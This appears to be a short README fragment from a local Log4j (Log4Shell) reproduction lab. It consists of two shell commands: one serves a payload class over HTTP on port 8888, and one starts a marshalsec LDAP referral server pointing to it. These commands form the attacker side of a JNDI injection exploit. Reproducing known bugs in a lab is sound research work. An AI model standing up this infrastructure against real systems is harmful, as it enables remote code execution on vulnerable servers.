```shell
cd log4j-bug
cd src/main/java
python -m http.server 8888
```

```shell
cd log4j-bug
cd src/main/resources
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#RMIServer"
```